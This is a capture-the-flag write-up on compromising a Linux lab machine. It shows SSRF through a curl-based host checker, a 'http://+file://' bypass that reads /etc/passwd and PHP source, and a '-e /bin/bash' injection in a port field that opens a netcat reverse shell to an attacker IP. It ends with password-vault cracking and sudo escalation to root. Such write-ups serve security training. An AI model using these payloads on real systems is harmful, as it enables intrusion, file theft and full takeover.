# CTF Writeup

## Enumeration

* Target: Linux virtual machine
* Open ports: **22 (SSH)** and **80 (HTTP)**

### Web Application on Port 80

* Website checks if a host is online
* If up: returns output of curl
* If down: displays "It is down for everyone."

### Verifying Backend Behavior

* Setup listener on attacker machine:

  ```bash
  nc -lvnp 1337
  ```
* Submit attacker IP in the web form
* Response:

  ```
  GET / HTTP/1.1
  Host: 10.10.14.36:1337
  User-Agent: curl/7.81.0
  ```
* ✅ Confirms server uses `curl` → vulnerable to SSRF

## SSRF Exploitation

### Accessing Localhost

* Submit:

  ```
  url=http://127.0.0.1:80
  ```
* Server requests its own web service → SSRF confirmed

### Bypassing File Access Restriction

* Direct `file:///etc/passwd` blocked
* Bypass using curl behavior:

  ```
  url=http://+file:///etc/passwd
  ```
* ✅ Successfully dumped `/etc/passwd`

## Source Code Disclosure

* Using same technique:

  ```
  url=http://+file:///var/www/html/index.php
  ```
* ✅ Retrieved PHP source code

### Hidden Feature Found

* Parameter: `expertmode=tcp`
* Path: `/index.php?expertmode=tcp`
* Unlocks advanced TCP scan form

## Remote Code Execution via Netcat

### Injection Payload

* Parameters:

  ```
  ip=10.10.14.36
  port=4444 -e /bin/bash
  ```
* Listener:

  ```
  nc -lvnp 4444
  ```
* ✅ Reverse shell received

## Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## User Enumeration and Password Vault

* Path: `/home/aleks/.local/share/pswm/pswm`
* Vault file from [pswm password manager](https://github.com/Julynx/pswm)
* File copied to local system for analysis

## Cracking the Vault

* Used Python + `pexpect` + `rockyou.txt`
* Based on this walkthrough:
  [YouTube: CTF Writeup](https://youtu.be/mi_t2Nz8dPk?si=5IGA4hs4znjme2AS&t=1113)
* ✅ Password cracked → credentials recovered

## Privilege Escalation

### SSH Login

```bash
ssh aleks@target
```

### Check Sudo Rights

```bash
sudo -l
```

* Aleks has full sudo rights

### Get Root

```bash
sudo su
cat /root/root.txt
```
